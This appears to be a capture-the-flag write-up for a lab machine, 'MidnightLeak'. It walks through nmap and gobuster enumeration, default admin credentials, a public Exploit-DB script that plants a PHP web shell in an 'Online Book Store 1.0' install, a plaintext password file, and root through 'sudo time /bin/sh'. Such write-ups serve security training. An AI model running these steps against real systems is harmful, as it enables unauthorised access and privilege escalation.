# MidnightLeak - ThunderCipher





Target Ip. Address : 192.168.5.98





Let's kickstart with the nmap scan.





```bash

kali@kali:nmap -sV -sC 192.168.5.98

Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 13:54 IST

Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan

NSE Timing: About 0.00% done

Nmap scan report for 192.168.5.98

Host is up (0.00012s latency).

Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 

|   3072 b2:d8:51:6e:c5:84:05:19:08:eb:c8:58:27:13:13:2f (RSA)

|   256 b0:de:97:03:a7:2f:f4:e2:ab:4a:9c:d9:43:9b:8a:48 (ECDSA)

|\_  256 9d:0f:9a:26:38:4f:01:80:a7:a6:80:9d:d1:d4:cf:ec (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

| http-robots.txt: 1 disallowed entry 

|\_gym

|\_http-title: Apache2 Ubuntu Default Page: It works

|\_http-server-header: Apache/2.4.41 (Ubuntu)

MAC Address: BC:24:11:5C:96:44 (Proxmox Server Solutions GmbH)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel



Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 6.57 seconds

```



So, we have two port, port 22(ssh) and port(80).



On port 80, we have a default apache page. Let's try gobuster to see any hidden directories.



```bash

kali@kali:gobuster dir -u http://192.168.5.98/ -w /usr/share/wordlists/dirb/big.txt 

===============================================================

Gobuster v3.6

by OJ Reeves (@TheColonial) \& Christian Mehlmauer (@firefart)

===============================================================

\[+] Url:                     http://192.168.5.98/

\[+] Method:                  GET

\[+] Threads:                 10

\[+] Wordlist:                /usr/share/wordlists/dirb/big.txt

\[+] Negative Status codes:   404

\[+] User Agent:              gobuster/3.6

\[+] Timeout:                 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/.htpasswd            (Status: 403) \[Size: 277]

/.htaccess            (Status: 403) \[Size: 277]

/admin                (Status: 301) \[Size: 312] \[--> http://192.168.5.98/admin/]

/robots.txt           (Status: 200) \[Size: 14]

/secret               (Status: 301) \[Size: 313] \[--> http://192.168.5.98/secret/]

/server-status        (Status: 403) \[Size: 277]

/store                (Status: 301) \[Size: 312] \[--> http://192.168.5.98/store/]

Progress: 20469 / 20470 (100.00%)

===============================================================

Finished

===============================================================

```





So, we have something. In /secret there is just a saying, nothing more.



The /store is more interesting. The admin login is default admin:admin.





Little online research, and this "CSE Bookstore" a.k.a "Online Book Store 1.0"  is vulnerable to Unauthenticated Remote Code Execution.



You can find the exploit in Exploit-DB. Run the exploit.



```bash

kali@kali:python3 exploit.py http://192.168.5.98/store 

> Attempting to upload PHP web shell...

> Verifying shell upload...

> Web shell uploaded to http://192.168.5.98/store/bootstrap/img/ojHAUgi7H5.php

> Example command usage: http://192.168.5.98/store/bootstrap/img/ojHAUgi7H5.php?cmd=whoami

> Do you wish to launch a shell here? (y/n): y

RCE $ id

uid=33(www-data) gid=33(www-data) groups=33(www-data)



RCE $ 

```





We have ourselves a reverse shell.





You can read the user.txt in the home directory of user tony.



```bash

RCE $ cat /home/tony/user.txt

ThunderCipher{p.....d}

```



There is also password.txt, which is password of user tony, read it and login as a user tony via ssh to get a proper tty.



```bash

RCE $ cat /home/tony/password.txt

ssh: yx.....YY

gym/admin: asdfghjklXXX

/store: admin@admin.com admin

```



```bash

kali@kali:ssh tony@192.168.5.98

The authenticity of host '192.168.5.98 (192.168.5.98)' can't be established.

ED25519 key fingerprint is SHA256:sMY2EwBNywi3V/cmpdMCtvcC6NM31k0H9CTRlsxALfY.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint])? yes

Warning: Permanently added '192.168.5.98' (ED25519) to the list of known hosts.

tony@192.168.5.98's password: 



Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86\_64)



&nbsp;\* Documentation:  https://help.ubuntu.com

&nbsp;\* Management:     https://landscape.canonical.com

&nbsp;\* Support:        https://ubuntu.com/advantage



&nbsp; System information as of Wed Feb  4 08:44:32 UTC 2026



&nbsp; System load:  0.0               Processes:              125

&nbsp; Usage of /:   81.2% of 4.66GB   Users logged in:        0

&nbsp; Memory usage: 54%               IPv4 address for ens18: 192.168.5.98

&nbsp; Swap usage:   0%



&nbsp;\* Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support

&nbsp;  on 31 May 2025.



&nbsp;  For more details see:

&nbsp;  https://ubuntu.com/20-04



61 updates can be installed immediately.

0 of these updates are security updates.

To see these additional updates run: apt list --upgradable





The list of available updates is more than a week old.

To check for new updates run: sudo apt update



Last login: Mon Jan 19 17:33:18 2026 from 192.168.5.126

tony@midnightleak:~$ 

```



Checking sudo privileges, there are many. You can utilize any of your wish.



```bash

tony@midnightleak:~$ sudo -l

Matching Defaults entries for tony on midnightleak:

&nbsp;   env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin



User tony may run the following commands on midnightleak:

&nbsp;   (root) NOPASSWD: /usr/bin/yelp

&nbsp;   (root) NOPASSWD: /usr/bin/dmf

&nbsp;   (root) NOPASSWD: /usr/bin/whois

&nbsp;   (root) NOPASSWD: /usr/bin/rlogin

&nbsp;   (root) NOPASSWD: /usr/bin/pkexec

&nbsp;   (root) NOPASSWD: /usr/bin/mtr

&nbsp;   (root) NOPASSWD: /usr/bin/finger

&nbsp;   (root) NOPASSWD: /usr/bin/time

&nbsp;   (root) NOPASSWD: /usr/bin/cancel

&nbsp;   (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh

```





I will use /usr/bin/time, to escalate to root.



```bash

tony@midnightleak:~$ sudo time /bin/sh

\# id

uid=0(root) gid=0(root) groups=0(root)

```





Boom!!! We are root. Let's read the final flag at root directory and wrap up this challenge.





```bash

\# cat root.txt

ThunderCipher{su.....on}

```



